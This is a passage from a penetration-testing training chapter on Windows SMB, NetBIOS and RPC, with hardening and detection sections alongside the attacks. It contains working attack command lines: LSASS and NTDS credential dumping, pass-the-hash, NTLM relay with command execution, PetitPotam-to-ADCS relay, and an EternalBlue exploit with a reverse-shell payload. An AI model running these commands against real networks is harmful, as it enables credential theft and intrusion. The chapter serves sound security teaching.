  │ 4. TGS-REP              │                         │
  │    (Service Ticket)     │                         │
  │<────────────────────────┤                         │
  │                          │                         │
  │ 5. AP-REQ (Service Ticket)                       │
  ├─────────────────────────────────────────────────>│
  │                          │                         │
  │ 6. AP-REP (Authenticated)                        │
  │<─────────────────────────────────────────────────┤
  │                          │                         │
  │ 7. SMB Operations                                │
  │<────────────────────────────────────────────────>│
```

**When Kerberos is Used**:
- Client and server are both domain-joined
- Client uses FQDN (fileserver.corp.local) not IP
- Ports 88 (Kerberos) and 464 (Kpasswd) are accessible

**When NTLM Fallback Occurs**:
- Client uses IP address
- Kerberos ports blocked
- Server not in domain
- Name resolution fails

### 8.3 Pass-the-Hash Concept

**Key Insight**: NTLM never sends the password, only a hash-based response. If you have the hash, you can authenticate.

**Attack Flow**:
```
1. Attacker compromises workstation
2. Dumps NTLM hashes from LSASS memory
   john:1000:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
   └─┬─┘      └────────LM Hash────────┘ └────────NT Hash────────┘
   Username

3. Uses hash to authenticate (no password needed)
   smbclient //192.168.1.100/C$ --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c
```

**Tools**:
```bash
# CrackMapExec with hash
nxc smb 192.168.1.100 -u john -H 8846f7eaee8fb117ad06bdd830b7586c

# impacket psexec with hash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/john@192.168.1.100

# mimikatz sekurlsa::pth
sekurlsa::pth /user:john /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c
```

---

## 9. Null Sessions & Guest Access

**BEGINNER EXPLANATION**: A null session is like entering a building through an unlocked service door. You didn't authenticate, but the door was open so you walked in. Once inside, you can look around and see what's available.

### 9.1 Null Session Concept

**What is it?**:
- Anonymous connection to IPC$ share
- No username or password required
- Enabled by default on Windows NT/2000/XP/2003
- Disabled by default on modern Windows (2008+)

**Why It Exists**:
- Legacy compatibility
- Allow network browsing
- Enable certain inter-domain trust operations

**What Can You Do?**:
- Enumerate users, groups, shares
- Query password policies
- Get SIDs
- Enumerate registry (if permissions allow)

### 9.2 Null Session Enumeration

**Test for Null Session**:
```bash
# Using smbclient
smbclient -L //192.168.1.100 -N

# Using rpcclient
rpcclient -U "" -N 192.168.1.100

# Using enum4linux
enum4linux -a 192.168.1.100
```

**Example Output**:
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Backup          Disk      Old backups
```

### 9.3 Restricting Null Sessions

**Registry Settings**:
```powershell
# Disable null session access to shares (except IPC$)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictNullSessAccess" -Value 1

# Disable null session enumeration entirely
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2
```

**RestrictAnonymous Values**:
- `0`: Default (allow enumeration)
- `1`: Don't allow enumeration of SAM accounts/shares
- `2`: No access without explicit anonymous permissions

---

## 10. SMB Relay Attacks

**BEGINNER EXPLANATION**: SMB Relay is like a waiter taking your credit card to the register, but instead of paying for your meal, they use it to buy something for themselves. You authenticated to server A, but the attacker relayed your authentication to server B.

### 10.1 Attack Prerequisites

**Requirements**:
1. **SMB Signing Disabled or Not Required** on target
2. Ability to intercept or trigger SMB authentication
3. Target credentials must have admin rights on destination

**Check SMB Signing**:
```bash
# Using Nmap
nmap --script smb-security-mode -p445 192.168.1.100

# Using CrackMapExec
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

**Output Interpretation**:
```
Message signing enabled but not required = VULNERABLE
Message signing enabled and required = PROTECTED
```

### 10.2 SMB Relay Attack Flow

```
Victim              Attacker (Relay)          Target Server
  │                        │                         │
  │ 1. Poisoned Response   │                         │
  │    (LLMNR/NBT-NS)      │                         │
  │<──────────────────────┤                         │
  │                        │                         │
  │ 2. SMB Auth to Attacker│                         │
  │    (NTLM Challenge/Resp)                        │
  ├──────────────────────>│                         │
  │                        │                         │
  │                        │ 3. Relay Auth to Target │
  │                        ├────────────────────────>│
  │                        │                         │
  │                        │ 4. Target Accepts       │
  │                        │    (No signing check)   │
  │                        │<────────────────────────┤
  │                        │                         │
  │                        │ 5. Attacker accesses    │
  │                        │    as Victim            │
  │                        │<───────────────────────>│
  │                        │  (Dump SAM, execute,    │
  │                        │   create user, etc.)    │
```

### 10.3 Performing SMB Relay with impacket

**Setup Responder** (disable SMB/HTTP servers):
```bash
# Edit Responder.conf
[Responder Core]
SMB = Off
HTTP = Off

# Run Responder
responder -I eth0 -v
```

**Run ntlmrelayx**:
```bash
# Basic relay
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and execute command
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay and dump SAM
ntlmrelayx.py -tf targets.txt -smb2support --sam

# Relay and dump NTDS (if DA)
ntlmrelayx.py -tf targets.txt -smb2support --ntds

# Relay to specific target with socks proxy
ntlmrelayx.py -t 192.168.1.100 -smb2support -socks

# Interactive shell
ntlmrelayx.py -tf targets.txt -smb2support -i
```

**Targets File** (relay_targets.txt):
```
192.168.1.100
192.168.1.101
192.168.1.102
```

### 10.4 Advanced Relay Techniques

**Cross-Protocol Relay** (SMB to LDAP):
```bash
# Relay SMB auth to LDAP, escalate privileges
ntlmrelayx.py -t ldap://192.168.1.10 -smb2support --escalate-user lowpriv
```

**Relay to MSSQL**:
```bash
ntlmrelayx.py -t mssql://192.168.1.50 -query "SELECT SYSTEM_USER"
```

**Petitpotam + Relay**:
```bash
# Force DC to authenticate to attacker
petitpotam.py attacker_ip dc_ip

# Relay DC authentication to ADCS
ntlmrelayx.py -t http://adcs-server/certsrv/certfnsh.asp --adcs --template DomainController
```

### 10.5 Defense Against SMB Relay

**Enable SMB Signing (Required)**:
```powershell
# Via Group Policy:
Computer Configuration → Policies → Windows Settings → Security Settings
→ Local Policies → Security Options
→ "Microsoft network server: Digitally sign communications (always)" = Enabled

# Via PowerShell:
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
```

**Disable NTLM (Use Kerberos Only)**:
```powershell
# Via Group Policy:
Computer Configuration → Policies → Windows Settings → Security Settings
→ Local Policies → Security Options
→ "Network security: LAN Manager authentication level" = "Send NTLMv2 response only\refuse LM & NTLM"
→ "Network security: Restrict NTLM: Incoming NTLM traffic" = "Deny all accounts"
```

**Network Segmentation**:
- Prevent workstation-to-workstation SMB
- Restrict admin access to jump boxes
- Monitor for SMB traffic anomalies

---

## 11. Pass-the-Hash & Credential Reuse

### 11.1 Dumping Credentials

**From LSASS (Requires Admin)**:
```powershell
# Using mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Using pypykatz (Python)
pypykatz lsa minidump lsass.dmp
```

**From SAM Database** (Local Accounts):
```bash
# Using impacket secretsdump
secretsdump.py 'CORP/admin:Password123@192.168.1.100'

# Using CrackMapExec
nxc smb 192.168.1.100 -u admin -p Password123 --sam
```

**From NTDS.dit** (Domain Controller):
```bash
# Method 1: VSS Shadow Copy
secretsdump.py 'CORP/admin:Password123@192.168.1.10' -just-dc

# Method 2: DCSync (requires Replicating Directory Changes)
secretsdump.py 'CORP/admin:Password123@192.168.1.10' -just-dc-user Administrator
```

### 11.2 Using Stolen Hashes

**impacket Examples**:
```bash
# psexec
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/john@192.168.1.100

# wmiexec
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/john@192.168.1.100

# smbexec
smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/john@192.168.1.100

# atexec (scheduled task)
atexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/john@192.168.1.100 "whoami"
```

**CrackMapExec Examples**:
```bash
# Execute command
nxc smb 192.168.1.100 -u john -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"

# Spray hash across subnet
nxc smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c --local-auth
```

### 11.3 Overpass-the-Hash (Pass-the-Key)

**Concept**: Use NTLM hash to request Kerberos TGT.

```powershell
# Using mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe

# In the new PowerShell window:
PS C:\> klist           # Shows Kerberos tickets
PS C:\> dir \\DC01\C$   # Triggers Kerberos auth, gets TGT
```

**Using Rubeus**:
```powershell
Rubeus.exe asktgt /user:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:CORP /ptt
```

---

## 12. EternalBlue (MS17-010)

**BEGINNER EXPLANATION**: EternalBlue is like finding a broken window in a building that lets you crawl inside and take over the security system. It's a vulnerability in SMBv1 that allows remote code execution.

### 12.1 Vulnerability Details

**CVE**: CVE-2017-0144 (and related: CVE-2017-0143 through CVE-2017-0148)

**Affected Systems**:
- Windows XP / Server 2003
- Windows Vista / Server 2008
- Windows 7 / Server 2008 R2
- Windows 8.1 / Server 2012 R2
- Windows 10 (early versions)
- **Only if SMBv1 is enabled**

**Technical Details**:
- Buffer overflow in srv.sys (SMBv1 driver)
- Incorrect handling of specially crafted SMB packets
- Corrupts kernel memory pool
- Allows arbitrary code execution as SYSTEM
- **Wormable**: Can spread automatically

### 12.2 Detection

**Using Nmap**:
```bash
nmap -p445 --script smb-vuln-ms17-010 192.168.1.0/24
```

**Using Metasploit**:
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
```

**Manual Detection**:
```python
#!/usr/bin/env python3
from scapy.all import *

def check_ms17_010(target):
    # SMB Negotiate with specific dialects
    # Vulnerable systems respond differently
    # (Implementation simplified for brevity)
    print(f"[*] Checking {target} for MS17-010...")
    # Send crafted SMB packets
    # Analyze response
    pass

# check_ms17_010("192.168.1.100")
```

### 12.3 Exploitation (Educational Purposes Only)

**Using Metasploit**:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

**Using AutoBlue (Python)**:
```bash
# Clone repository
git clone https://github.com/3ndG4me/AutoBlue-MS17-010

# Generate shellcode
cd AutoBlue-MS17-010/shellcode
./shell_prep.sh

# Exploit
cd ../
python eternalblue_exploit7.py 192.168.1.100 shellcode/sc_x64.bin
```

### 12.4 Defense

**Patch**:
- Install MS17-010 security update
- Windows Update handles this automatically on supported systems

**Disable SMBv1**:
```powershell
# PowerShell (recommended)
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Check if SMBv1 is enabled
Get-SmbServerConfiguration | Select EnableSMB1Protocol
```

**Network Segmentation**:
- Block SMB (445, 139) at perimeter firewall
- Restrict SMB between network segments
- Monitor for SMB scanning activity

---

## 13. Lateral Movement Techniques

**BEGINNER EXPLANATION**: Lateral movement is like a thief who breaks into one apartment, finds keys to other apartments, and moves from room to room until they reach the penthouse (Domain Controller).

### 13.1 PsExec Internals

**How PsExec Works**:
```
1. Connect to ADMIN$ share (\\TARGET\ADMIN$)
2. Upload psexesvc.exe to C:\Windows
3. Connect to IPC$ share
4. Open \pipe\svcctl named pipe (Service Control Manager)
5. Send RPC command to create service:
   Service Name: PSEXESVC
   Binary Path: C:\Windows\psexesvc.exe
6. Send RPC command to start service
7. Service runs as SYSTEM and executes command
8. Output redirected through named pipe
9. Clean up: Stop service, delete service, delete binary
```

**Using Sysinternals PsExec**:
```cmd
PsExec.exe \\192.168.1.100 -u CORP\admin -p Password123 cmd.exe
```

**Using impacket psexec.py**:
```bash
psexec.py CORP/admin:Password123@192.168.1.100
```

**Artifacts**:
- Service creation event (Event ID 7045)
- PSEXESVC service in registry (temporarily)
- Psexesvc.exe in C:\Windows (briefly)

### 13.2 WMI Execution

**How WMI Works**:
- Uses DCOM (Distributed COM) over RPC
- Connects to port 135, then dynamic port
- No file written to disk (fileless)
- Executes via WMI Provider Host (WmiPrvSE.exe)

**Using wmic (Native Windows)**:
```cmd
wmic /node:192.168.1.100 /user:CORP\admin /password:Password123 process call create "cmd.exe /c whoami > C:\output.txt"
```

**Using impacket wmiexec.py**:
```bash
wmiexec.py CORP/admin:Password123@192.168.1.100
```

**Using PowerShell**:
```powershell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName 192.168.1.100 -Credential $cred
```

**Artifacts**:
- WMI event logs (Event ID 5857-5861)
- WmiPrvSE.exe spawning processes
- Network connection to port 135

### 13.3 SCshell

**Concept**: Alternative to PsExec using Service Control Manager directly.

**Using impacket**:
```bash
# No implementation in impacket, but possible via custom RPC calls
```

**Manual via sc.exe**:
```cmd
sc \\192.168.1.100 create TestService binPath= "cmd.exe /c whoami > C:\output.txt"
sc \\192.168.1.100 start TestService
sc \\192.168.1.100 delete TestService
```

### 13.4 Scheduled Tasks

**Using at.exe** (Legacy, Windows 2008 and earlier):
```cmd
net time \\192.168.1.100
at \\192.168.1.100 15:30 "cmd.exe /c whoami"
```

**Using schtasks** (Modern):
```cmd
schtasks /create /tn "MyTask" /tr "cmd.exe /c whoami" /sc once /st 15:30 /s 192.168.1.100 /u CORP\admin /p Password123
schtasks /run /tn "MyTask" /s 192.168.1.100 /u CORP\admin /p Password123
schtasks /delete /tn "MyTask" /s 192.168.1.100 /u CORP\admin /p Password123 /f
```

**Using impacket atexec.py**:
```bash
atexec.py CORP/admin:Password123@192.168.1.100 "whoami"
```

### 13.5 DCOM Execution

**Abusing MMC20.Application**:
```powershell
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.100"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

**Abusing ShellBrowserWindow**:
```powershell
$com = [Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.1.100"))
$com.Application.ShellExecute("cmd.exe", "/c calc.exe", "", "", 0)
```

---

## 14. RPC & Named Pipes: Deep Internal Access

### 14.1 Named Pipe Listing

**Using PowerShell**:
```powershell
# List named pipes on local system
[System.IO.Directory]::GetFiles("\\.\\pipe\\")

# Or using Get-ChildItem
Get-ChildItem \\.\pipe\
```

**Using PipeList (Sysinternals)**:
```cmd
pipelist.exe
```

### 14.2 Named Pipe Impersonation

**Concept**: If a privileged process connects to your named pipe, you can impersonate its security context.

**Attack Flow**:
```
1. Attacker creates named pipe: \\.\pipe\malicious
2. Attacker waits for connection
3. SYSTEM process connects (tricked or misconfigured)
4. Attacker impersonates SYSTEM
5. Attacker performs privileged actions
```

**Detection**: Monitor for suspicious named pipe creation and access.

### 14.3 RPC Service Exploitation

**Finding Accessible RPC Services**:
```bash
# Enumerate RPC services
rpcdump.py 192.168.1.100

# Test specific UUID
impacket-rpcdump 192.168.1.100 | grep -A5 "367abb81-9844-35f1-ad32-98f038001003"
```

---

## 15. Defense & Detection

### 15.1 Hardening SMB

**Checklist**:
- [ ] Disable SMBv1
- [ ] Require SMB signing
- [ ] Disable NTLM (use Kerberos)
- [ ] Restrict anonymous access
- [ ] Remove unnecessary shares
- [ ] Restrict ADMIN$ and C$ access
- [ ] Enable firewall rules
- [ ] Monitor SMB traffic

**PowerShell Hardening Script**:
```powershell
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Require SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Restrict anonymous access
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2

# Disable LLMNR
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

# Disable NBT-NS
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)
}
```

### 15.2 Detection with Windows Event Logs

**Key Event IDs**:
```
Security.evtx:
  4624 - Successful logon (Type 3 = Network logon via SMB)
  4625 - Failed logon
  4672 - Special privileges assigned (admin logon)
  4776 - NTLM authentication
  
System.evtx:
  7045 - Service installation (PsExec detection)
  
Microsoft-Windows-SMBServer/Security:
  1009 - SMB signing disabled connection attempt
  
Microsoft-Windows-SMBClient/Security:
  31001 - Failed to connect (SMB signing mismatch)
```

**Detecting SMB Relay**:
- Multiple authentication attempts from same source to different destinations
- Authentication without prior DNS lookup
- SMB connections with signing disabled

**Splunk Query Example**:
```spl
index=windows EventCode=4624 Logon_Type=3
| stats count by Source_Network_Address, Account_Name, Computer
| where count > 10
```

### 15.3 Honey Tokens

**Concept**: Create fake accounts with attractive names and monitor for usage.

```powershell
# Create honey user
net user "SQL_Admin" "ComplexPass123!" /add /domain
net localgroup "Administrators" "SQL_Admin" /add /domain

# Set alert on any authentication attempt
# (via SIEM or scheduled task checking event logs)
```

---

## 16. Practical Lab: Manual SMB Interaction

### Lab 1: Share Enumeration and Access

**Objective**: Enumerate shares and access files.

**Step 1: List Shares**:
```bash
smbclient -L //192.168.1.100 -N
```

**Step 2: Connect to Share**:
```bash
smbclient //192.168.1.100/Backups -U "CORP\john%Password123"
```

**Step 3: Browse and Download**:
```bash
smb: \> ls
smb: \> cd confidential
smb: \> get passwords.txt
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
smb: \> exit
```

### Lab 2: RPC Enumeration

**Objective**: Extract user and group information via RPC.

```bash
rpcclient -U "CORP\john%Password123" 192.168.1.100

# List users
rpcclient $> enumdomusers

# Get user details
rpcclient $> queryuser 500

# List groups
rpcclient $> enumdomgroups

# Get group members
rpcclient $> querygroupmem 512

# Get password policy
rpcclient $> getdompwinfo

# Exit
rpcclient $> quit
```

### Lab 3: SMB Relay Attack

**Setup**:
- Attacker: 192.168.1.50 (Kali Linux)
- Victim: 192.168.1.101 (Windows Workstation)
- Target: 192.168.1.102 (Windows Server, SMB signing disabled)

**Step 1: Configure Responder**:
```bash
nano /etc/responder/Responder.conf
# Set SMB = Off, HTTP = Off

responder -I eth0 -v
```

**Step 2: Run ntlmrelayx**:
```bash
echo "192.168.1.102" > targets.txt
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

**Step 3: Trigger Authentication** (from victim machine):
```cmd
# Have victim attempt to access non-existent share
\\FAKESHARE\nonexistent
```

**Result**: Attacker relays authentication to target and executes command.

### Lab 4: Pass-the-Hash

**Objective**: Use captured hash to authenticate.

```bash
# Assume we have hash: 8846f7eaee8fb117ad06bdd830b7586c

# Test with CrackMapExec
nxc smb 192.168.1.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Get shell with psexec
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.1.100
```

---

## 17. Critical Analysis & Checkpoints

### 17.1 Common Pitfalls

**1. Confusing SMB Versions**:
- SMBv1 = dangerous, must disable
- SMBv3 = secure, use with encryption

**2. Forgetting SMB Signing**:
- "Enabled" ≠ "Required"
- Must be "Required" to prevent relay

**3. Overlooking Null Sessions**:
- Check legacy systems and NAS devices
- Often the initial foothold

**4. Ignoring RPC**:
- RPC is as important as SMB for lateral movement
- Named pipes are the hidden highway

### 17.2 Checkpoint Questions

**Q1**: What is the difference between `C$` and a normal share like `Docs`?
- **Answer**: `C$` is an administrative share created automatically by Windows, accessible only to administrators. `Docs` is a user-created share with custom ACLs that can be accessed by any user with permissions.

**Q2**: Why does PsExec require Administrator rights?
- **Answer**: PsExec writes to ADMIN$ (C:\Windows), creates and starts a service via the Service Control Manager RPC interface. Both operations require Administrator privileges.

**Q3**: Can you relay Kerberos authentication?
- **Answer**: Generally no. Kerberos tickets are service-specific (tied to SPN). Replaying a ticket for Server A to Server B won't work. However, unconstrained delegation scenarios can be exploited.

**Q4**: Why is SMB signing important?
- **Answer**: SMB signing cryptographically signs each packet using the session key. This prevents relay attacks because the attacker cannot forge a valid signature without knowing the password.

**Q5**: What's the difference between NTLMv1 and NTLMv2?
- **Answer**: NTLMv2 uses HMAC-MD5 (stronger), includes client and server challenges, adds timestamp for replay protection. NTLMv1 uses weak DES encryption and is vulnerable to rainbow tables. Both are vulnerable to relay if SMB signing is disabled.

**Q6**: How do you detect SMB relay attacks?
- **Answer**: Look for rapid authentication attempts from one source to multiple destinations, SMB connections with signing disabled, authentication without DNS lookups, suspicious service creations (Event ID 7045).

### 17.3 Real-World Scenarios

**Scenario 1: Initial Access via Null Session**:
- Discover Windows 2003 file server
- Null session enumeration reveals users
- Password spray finds weak credentials
- Pivot to domain admin via Kerberoasting

**Scenario 2: Lateral Movement via SMB Relay**:
- Poison LLMNR/NBT-NS with Responder
- Relay captured auth to servers without SMB signing
- Dump SAM/NTDS hashes
- Pass-the-hash to additional systems

**Scenario 3: Persistence via RPC**:
- Create scheduled task via RPC
- Task runs as SYSTEM periodically
- Establishes reverse shell to C2 server
- Maintains access even if passwords change

### 17.4 Final Thoughts

SMB and RPC are the nervous system of Windows networks. They enable file sharing, remote administration, and inter-process communication. For attackers, they are the highways to lateral movement and domain domination. For defenders, they are critical infrastructure that must be monitored and hardened.

**Key Takeaways**:
- SMB signing is mandatory for security
- SMBv1 must be disabled
- NTLM should be replaced with Kerberos
- Monitor for suspicious SMB/RPC activity
- Segment networks to limit lateral movement
- Use least privilege for service accounts

**Next Steps**:
- Practice in lab environment (virtual network)
- Study Active Directory attack paths
- Learn Kerberos in depth
- Master detection and incident response
- Build automated enumeration tools

---

*End of Chapter 07 - SMB, NetBIOS & RPC*


